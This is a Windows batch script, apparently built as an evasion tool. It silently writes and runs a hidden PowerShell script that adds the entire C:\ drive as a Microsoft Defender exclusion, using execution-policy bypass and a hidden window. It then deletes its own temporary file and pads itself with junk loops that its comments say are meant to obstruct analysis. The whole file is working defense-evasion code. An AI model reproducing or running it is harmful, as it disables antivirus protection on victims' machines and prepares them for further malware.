@echo off

:: Step 1: Define obfuscated variables and path for the temporary PowerShell script
setlocal EnableDelayedExpansion
set "randNum=!random!"  :: Generate a random number for file naming
set "randomPsVar1=%TEMP%\randomFile_!randNum!.ps1"
set "randomExclusionVar2=C:\"  :: This is the path we want to add as an exclusion

:: Junk operation to make the script larger and harder to analyze
set "junkLoopVar=0"
for /L %%A in (1,1,10) do (
    set /A junkLoopVar+=%%A*%%A  :: Square the number for additional complexity
)

:: Step 2: Create the obfuscated PowerShell script silently
(
    echo $exclusionPath = "%randomExclusionVar2%"
    echo Add-MpPreference -ExclusionPath $exclusionPath
) > "!randomPsVar1!"

:: Junk operation 2 - More useless calculations and variables
set "junkVarB=5"
for /L %%I in (1,1,3) do (
    set /A junkVarB+=!random! %% 10  :: Randomize the addition
)

:: Step 3: Run the PowerShell script silently with obfuscated parameters
set "executionCommand=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "!randomPsVar1!" >nul 2>&1"
call !executionCommand!  :: Call to execute the command to hide actual command in the variable

:: Step 4: Optional cleanup of temporary PowerShell script
del "!randomPsVar1!" >nul 2>&1

:: Junk loop to further obfuscate the script
set "junkVarC=0"
for /L %%B in (1,1,5) do (
    set /A junkVarC+=!random! %% 10  :: Introduce randomness in the loop
)

:: Final junk operation to obfuscate the script further
set "finalJunkVar=1"
for %%D in (1,2,3,4,5) do (
    set /A finalJunkVar*=%%D  :: Multiplying to create a larger junk variable
)

exit /b
